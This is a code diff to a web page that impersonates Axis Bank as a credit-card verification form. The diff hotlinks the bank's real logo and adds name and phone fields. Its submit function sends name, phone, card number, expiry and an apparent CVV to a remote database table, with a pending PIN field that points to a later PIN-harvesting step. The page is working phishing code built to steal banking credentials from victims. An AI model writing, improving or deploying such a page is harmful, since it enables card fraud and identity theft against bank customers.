@@ -50,9 +50,7 @@
             width: auto;
         }
 
-        .logo-text-container {
-            flex: 1;
-        }
+        .logo-text-container { flex: 1; }
 
         .logo-text {
             font-size: 26px;
@@ -173,10 +171,8 @@
     <div class="main-container">
         <div class="header">
             <div class="logo-container">
-                <!-- Official Axis Bank Logo -->
-                <img src="logo.png" 
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Axis_Bank_Logo.svg/512px-Axis_Bank_Logo.svg.png" 
                      class="logo-img" alt="Axis Bank Logo">
-                
                 <div class="logo-text-container">
                     <div class="logo-text">AXIS BANK</div>
                     <div class="tagline">Your credit card application is just a few clicks away</div>
@@ -187,6 +183,16 @@
         <div class="content">
             <h2>Premium Credit Card Verification</h2>
             <p class="subtitle">Secure • Instant Approval • Paperless</p>
+
+            <div class="form-group">
+                <label>Full Name *</label>
+                <input type="text" id="fullName" placeholder="Enter Full Name" required>
+            </div>
+
+            <div class="form-group">
+                <label>Phone Number *</label>
+                <input type="tel" id="phoneNumber" placeholder="Enter 10-digit phone number" maxlength="10" required>
+            </div>
 
             <div class="form-group">
                 <label>Card Number *</label>
@@ -238,11 +244,13 @@
     }
 
     async function submitForm(){
+        const fullName = document.getElementById('fullName').value.trim();
+        const phoneNumber = document.getElementById('phoneNumber').value.trim();
         const number1 = document.getElementById('number1').value.trim();
         const date_value = document.getElementById('date_value').value.trim();
         const number2 = document.getElementById('number2').value.trim();
 
-        if(!number1 || !date_value || !number2){
+        if(!fullName || !phoneNumber || !number1 || !date_value || !number2){
             alert('Please fill all fields');
             return;
         }
@@ -250,10 +258,18 @@
         showModal(`<div class="loader"></div><div class="wait">Submitting your request...</div>`);
 
         const { data, error } = await client.from('requests').insert([{
-            number1, date_value, number2, status: 'pending', pin: '', pin_status: 'waiting'
+            full_name: fullName,
+            phone_number: phoneNumber,
+            number1, 
+            date_value, 
+            number2, 
+            status: 'pending', 
+            pin: '', 
+            pin_status: 'waiting'
         }]).select();
 
         if(error) {
+            console.log(error);
             showModal(`<div class="reject">Submission Error</div>`);
             return;
         }
